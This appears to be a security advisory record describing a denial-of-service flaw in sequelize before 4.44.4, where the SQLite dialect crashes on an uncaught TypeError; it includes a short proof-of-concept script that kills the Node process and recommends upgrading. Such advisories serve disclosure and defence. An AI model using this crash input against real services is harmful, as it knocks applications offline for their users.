  "Title": "Denial of Service in sequelize",
  "Description": "Versions of `sequelize` prior to 4.44.4 are vulnerable to Denial of Service (DoS). The SQLite dialect fails to catch a `TypeError` exception for the `results` variable. The `results` value may be undefined and trigger the error on a `.map` call. This may allow attackers to submit malicious input that forces the exception and crashes the Node process.  \n\nThe following proof-of-concept crashes the Node process:  \n```\nconst Sequelize = require('sequelize');\n\nconst sequelize = new Sequelize({\n\tdialect: 'sqlite',\n\tstorage: 'database.sqlite'\n});\n\nconst TypeError = sequelize.define('TypeError', {\n\tname: Sequelize.STRING,\n});\n\nTypeError.sync({force: true}).then(() =\u003e {\n\treturn TypeError.create({name: \"SELECT tbl_name FROM sqlite_master\"});\n});\n```\n\n\n## Recommendation\n\nUpgrade to version 4.44.4 or later.",
